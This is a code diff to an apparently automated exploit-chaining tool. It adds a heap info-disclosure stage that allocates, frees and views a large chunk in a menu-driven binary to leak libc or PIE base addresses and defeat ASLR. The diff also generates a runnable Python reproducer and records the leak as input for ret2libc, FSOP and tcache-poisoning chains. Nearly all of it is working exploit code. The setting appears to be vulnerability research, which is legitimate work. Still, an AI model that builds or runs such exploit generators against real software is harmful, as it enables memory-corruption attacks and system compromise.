@@ -163,7 +163,10 @@ def chain_primitive_stage(ctx) -> dict:
         # the ASLR-defeat leak the control-flow chains consume). Only when such a lead exists.
         dlead = _disclose_lead(ctx.conn, target)
         if dlead is not None and not substrate.native_only_reason(target.file_type, "disclosure"):
-            got = _oob_read_disclose_stage(ctx, target, dlead)
+            # Two shapes: a reclaimed-heap read (free a chunk, read its stale allocator metadata)
+            # and an out-of-bounds array read steered onto a GOT slot. Each self-skips if it does
+            # not fit; both recover a libc/PIE base (ASLR defeat) as a poc-backed L3.
+            got = _heap_uninit_disclose(ctx, target, dlead) or _oob_read_disclose_stage(ctx, target, dlead)
             if got:
                 return got
         ctx.emit("chain.done", payload={"applicable": False,
@@ -2516,6 +2519,219 @@ def _file_oob_read_disclose_l3(ctx, target, lead, hit):
     ctx.progress(pct=100, msg=f"L3 CONFIRMED: OOB read -> {base_kind} {base:#x}")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": "oob_read", "disclosure": kind}}
+
+
+# ------------------------------------- CWE-457 uninitialised / reclaimed heap read -> disclosure
+_UNINIT_BIG, _UNINIT_GUARD = 0x4F8, 0x18             # big -> unsorted bin (fd == main_arena); a guard
+
+
+def _heap_leak_vals(leak: bytes):
+    """Pointer-sized values a heap view disclosed (full 8-byte LE words + 0x-hex), for base
+    recovery."""
+    import re as _re
+    from . import leak as _leak
+    vals = list(_leak._le_pointer_words(leak))
+    vals += [int(m, 16) for m in _re.findall(rb"0x([0-9a-fA-F]{6,16})", leak)]
+    return vals
+
+
+def _heap_uninit_run(ctx, spawn, width, roles, model, uoff, target_bytes, *, skip_free):
+    """One in-process heap info-disclosure run: allocate a large chunk (frees to the unsorted bin,
+    whose fd is a `main_arena` libc pointer) + a guard, free it, then VIEW that reclaimed memory --
+    its stale allocator metadata discloses the libc base (`leaked - unsorted_bin_offset`, accepted
+    only when PAGE ALIGNED) or, from a surviving image pointer, the PIE base (`recover_pie_base`).
+    `skip_free=True` is the negative control: the SAME view of a still-live chunk discloses no base.
+    Returns {kind, base, idx, size, off} or None. Forgery-proof -- an in-bounds/live read cannot
+    produce a page-aligned libc base, and PIE needs >=2 corroborating image pointers."""
+    from ..fuzz import menu
+    from . import exploit
+    add, free, view = roles["add"], roles["free"], roles["view"]
+    proc = spawn()
+    try:
+        _pie_drain(proc)
+
+        def send(b):
+            proc.stdin.write(b)
+            proc.stdin.flush()
+
+        def alloc(idx, size):
+            send(menu._scalar(add.encode(), width) + menu._fill(
+                model.get(add, []), idx=str(idx).encode(), num=str(size).encode(), width=width))
+            _pie_drain(proc)
+
+        def free_i(idx):
+            send(menu._scalar(free.encode(), width) + menu._scalar(str(idx).encode(), width))
+            _pie_drain(proc)
+
+        def view_i(idx):
+            send(menu._scalar(view.encode(), width) + menu._scalar(str(idx).encode(), width))
+            return _pie_drain(proc)[0]
+
+        alloc(0, _UNINIT_BIG)
+        alloc(1, _UNINIT_GUARD)                          # keep the big chunk off the top
+        if not skip_free:
+            free_i(0)                                     # -> unsorted bin: fd == main_arena
+        vals = _heap_leak_vals(view_i(0))                 # read the reclaimed chunk's metadata
+        if uoff:
+            for v in vals:
+                b = v - uoff
+                if b > 0 and b % 0x1000 == 0 and 0x3F0000000000 <= v < 0x800000000000:
+                    return {"kind": "libc", "base": b, "idx": 0, "size": _UNINIT_BIG, "off": uoff}
+        pie = exploit.recover_pie_base(vals, target_bytes)
+        if pie:
+            anchor = next(((v - pie) for v in vals
+                           if (v - pie) in (set(exploit.elf_functions(target_bytes).values())
+                                            | set(exploit.elf_objects(target_bytes).values()))), None)
+            if anchor is not None:
+                return {"kind": "pie", "base": pie, "idx": 0, "size": _UNINIT_BIG, "off": anchor}
+        return None
+    except (BrokenPipeError, OSError):
+        return None
+    finally:
+        from ..dynamic import sandbox as _sb
+        _sb.kill_quietly(proc)
+
+
+def _heap_uninit_disclose(ctx, target, lead):
+    """Weaponize a CWE-457/125 read lead on a HEAP-menu target into a confirmed libc/PIE DISCLOSURE:
+    free a large chunk and read the reclaimed memory, whose stale allocator metadata leaks the base.
+    Promotes what heap_trace could only CORROBORATE into a poc-backed L3 with a runnable reproducer.
+    Gated by a negative control (the same view of a live chunk discloses no base)."""
+    from ..dynamic import heap_discover
+    from . import heap as _heap
+    from .exploit_stage import _libc_bytes_for
+    target_bytes = ctx.content.path(target.sha256).read_bytes()
+    libc_data = _libc_bytes_for(ctx, target) or b""
+    staged = _stage_and_crawl(ctx, target, exe_dir=None)
+    if not staged:
+        return None
+    wd, exe, opts, model, width = staged
+    try:
+        roles = heap_discover.identify_heap_ops(wd, exe, model, opts, width)
+        if not roles or not roles.get("view"):
+            return None
+        uoff = 0
+        if libc_data:
+            try:
+                p = Path(wd) / "libc_for_uoff.so"
+                p.write_bytes(libc_data)
+                uoff = _heap.unsorted_bin_offset(str(p)) or 0
+            except Exception:                            # noqa: BLE001
+                uoff = 0
+        spawn = _pie_spawn(wd, exe)
+        hit = _heap_uninit_run(ctx, spawn, width, roles, model, uoff, target_bytes, skip_free=False)
+        if not hit:
+            return None
+        # Negative control: the SAME view WITHOUT the free must disclose no base.
+        if _heap_uninit_run(ctx, spawn, width, roles, model, uoff, target_bytes, skip_free=True):
+            ctx.emit("chain.hoc", payload={"ok": False, "note": "live-chunk view also disclosed a base"})
+            return None
+        return _file_heap_uninit_disclose_l3(ctx, target, lead, roles, hit, model.get(roles["add"], []))
+    finally:
+        shutil.rmtree(wd, ignore_errors=True)
+
+
+def _heap_uninit_repro_script(roles, hit, add_fields) -> bytes:
+    """A stdlib-only reproducer for the reclaimed-heap disclosure: allocate a large chunk + a guard,
+    free the big one (its fd becomes a libc `main_arena` pointer), view the reclaimed memory and
+    subtract the baked offset -- a page-aligned result is the recovered base. `add_fields` is the
+    allocator option's field template, so the reproducer drives it exactly as the crawl did
+    (feeding the size, and the buffer bytes for a read()-backed allocator)."""
+    add, free, view = roles["add"], roles["free"], roles["view"]
+    label = "libc base" if hit["kind"] == "libc" else "PIE image base"
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Reclaimed-heap info-disclosure reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
+        "import subprocess, select, os, re, sys, time\n"
+        f"ADD={add!r}; FREE={free!r}; VIEW={view!r}; BIG={_UNINIT_BIG}; GUARD={_UNINIT_GUARD}; "
+        f"OFF={hit['off']:#x}; LABEL={label!r}; ADD_FIELDS={list(add_fields)!r}\n"
+        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
+        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "def drain(t=0.4):\n"
+        "  b=b''; end=time.time()+t\n"
+        "  while time.time()<end:\n"
+        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
+        "    if r:\n"
+        "      c=os.read(p.stdout.fileno(),4096)\n"
+        "      if not c: break\n"
+        "      b+=c\n"
+        "    elif p.poll() is not None: break\n"
+        "  return b\n"
+        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
+        "def alloc(i,sz):\n"
+        "  send(ADD+'\\n')\n"
+        "  for f in ADD_FIELDS:\n"                        # drive the allocator's own field order
+        "    if f=='idx': send(str(i)+'\\n')\n"
+        "    elif f=='num': send(str(sz)+'\\n')\n"
+        "    elif f=='str': send(b'A'*sz+b'\\n')\n"       # the buffer bytes (a read()-backed alloc)
+        "  drain()\n"
+        "drain()\n"
+        "alloc(0,BIG); alloc(1,GUARD)\n"
+        "send(FREE+'\\n'); send('0\\n'); drain()\n"
+        "send(VIEW+'\\n'); out=send('0\\n') or drain()\n"
+        "vals=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(1,len(out)-7))]\n"
+        "vals+=[int(m,16) for m in re.findall(rb'0x([0-9a-fA-F]{6,16})',out)]\n"
+        "base=next((v-OFF for v in vals if (v-OFF)>0 and (v-OFF)%0x1000==0 and v>(1<<46)), None)\n"
+        "print('[+] reclaimed-heap read -> %s %#x'%(LABEL,base) if base else '[-] no base disclosed')\n"
+        "sys.exit(0 if base else 1)\n"
+    ).encode()
+
+
+def _file_heap_uninit_disclose_l3(ctx, target, lead, roles, hit, add_fields):
+    """File a confirmed reclaimed-heap information disclosure as an L3 verified PoC -- promoting what
+    the heap tracer could only mark 'corroborated' into a poc-backed bundle with a runnable leak."""
+    import json as _json
+
+    from ...db.dao import FindingDAO, PocDAO
+    from . import bundle
+    kind, base = hit["kind"], hit["base"]
+    base_kind = "libc base" if kind == "libc" else "PIE image base"
+    script = _heap_uninit_repro_script(roles, hit, add_fields)
+    input_sha = ctx.put_artifact("heap-uninit-disclose-repro", data=script)
+    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
+            "exploit": f"{lead.cwe} reclaimed-heap read -> {base_kind} disclosure",
+            "base": hex(base), "base_kind": kind, "view_option": roles["view"],
+            "tool_version": TOOL_VERSION}
+    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
+                        "stdin", [], None,
+                        primitive={"type": "uninit_read", "target": base_kind, "confirmed": True,
+                                   "note": f"{base_kind} disclosure"})
+    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
+    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
+                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
+    forge = ("the disclosed value minus the measured unsorted-bin offset is page aligned"
+             if kind == "libc"
+             else "at least two leaked pointers' page offsets match image symbols and agree")
+    eff = (f"working information disclosure ({lead.cwe} -> {base_kind}): option {roles['add']} "
+           f"allocated a large chunk (which frees to the unsorted bin, whose fd is a libc "
+           f"main_arena pointer), option {roles['free']} freed it, and option {roles['view']} read "
+           f"the RECLAIMED memory -- disclosing its stale allocator metadata and so the {base_kind} "
+           f"{base:#x} (ASLR defeated). Forgery-proof: {forge}, which a live-chunk read cannot "
+           f"produce (the negative control did not). This is the leak a "
+           f"{'ret2libc / FSOP / tcache-poison' if kind == 'libc' else 'PIE code-reuse'} chain "
+           f"consumes.")
+    fd = FindingDAO(ctx.conn)
+    cand = {"cwe": lead.cwe,
+            "title": f"Information disclosure (demonstrated): L3 reclaimed-heap read -> {base_kind}",
+            "severity": "high", "detector": "chain_primitive", "state": "poc-backed",
+            "confidence": 0.99, "authoritative": True, "title_only": True,
+            "dedup_key": f"chain:heap-uninit-disclose:{kind}:{target.id}", "site_detail": base_kind,
+            "evidence": [{"channel": "effects", "detail": _json.dumps([{
+                "kind": "disclosure",
+                "title": f"Reclaimed-heap read -> {base_kind} (ASLR defeated)",
+                "status": "demonstrated", "detail": eff,
+                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
+                          "note": eff}}])}]}
+    fd.upsert(target.id, target.case_id, cand)
+    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
+    if fid:
+        PocDAO(ctx.conn).set_finding(poc_id, fid)
+    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
+    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": "uninit_read",
+             "disclosure": base_kind, "base": hex(base), "bundle": bundle_sha})
+    ctx.progress(pct=100, msg=f"L3 CONFIRMED: reclaimed-heap read -> {base_kind} {base:#x}")
+    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
+            "metrics": {"chained": True, "level": "L3", "vclass": "uninit_read", "disclosure": kind}}
 
 
 # ------------------------------------------------------- CWE-125 out-of-bounds read -> disclosure
